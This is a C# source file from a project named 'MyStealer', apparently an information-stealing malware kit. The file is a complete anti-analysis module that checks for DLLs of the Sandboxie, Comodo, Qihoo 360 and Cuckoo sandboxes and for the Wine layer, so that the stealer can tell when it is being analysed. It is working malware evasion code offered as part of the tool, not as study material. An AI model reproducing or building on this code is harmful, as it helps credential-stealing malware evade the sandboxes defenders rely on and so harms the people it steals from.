using System;
using static MyStealer.AntiDebug.Win32Calls;


namespace MyStealer.AntiDebug.Check
{
    internal class LoadedModules : CheckBase
    {
        public override string Name => "Loaded modules";

        private readonly string[] moduleNames = new string[]
        {
            "SbieDll.dll", // Sandboxie
            "cmdvrt32.dll", // Comodo Sandbox
            "cmdvrt64.dll", // Comodo Sandbox
            "SxIn.dll", // Qihoo 360 Sandbox
            "cuckoomon.dll", // Cuckoo Sandbox
        };

        public override bool CheckActive()
        {
            foreach (var name in moduleNames)
            {
                if (GetModuleHandle(name) != IntPtr.Zero)
                {
                    Logger.Information("Bad module {name} found.", name);
                    return true;
                }
            }

            if (GetProcAddress(GetModuleHandle("kernel32"), "wine_get_unix_file_name") != IntPtr.Zero)
            {
                Logger.Information("Detected wine kernel32.");
                return true;
            }

            return false;
        }
    }
}
